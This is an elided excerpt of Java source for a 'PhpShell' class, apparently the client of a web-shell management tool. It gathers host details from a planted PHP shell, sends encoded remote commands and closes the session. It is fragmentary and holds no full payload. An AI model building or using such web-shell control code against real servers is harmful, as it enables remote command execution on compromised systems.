...
public class PhpShell
  ...
  public String getBasicsInfo() {
    ...
    Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|canCallGzipDecode|canCallGzipEncode|systempdir) : (.+)");
    ...
    this.systempdir = pxMap.get("systempdir");
  ...
  public String execCommand(String commandStr) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("cmdLine", this.encoding.Encoding(commandStr.trim()));
  ...
  public boolean close() {
    this.isAlive = false;
    ReqParameter reqParameter = new ReqParameter();
    String result = this.encoding.Decoding(evalFunc(null, "g_close", reqParameter));
    if ("ok".equals(result)) {
      return true;
    }
    Log.error(result);
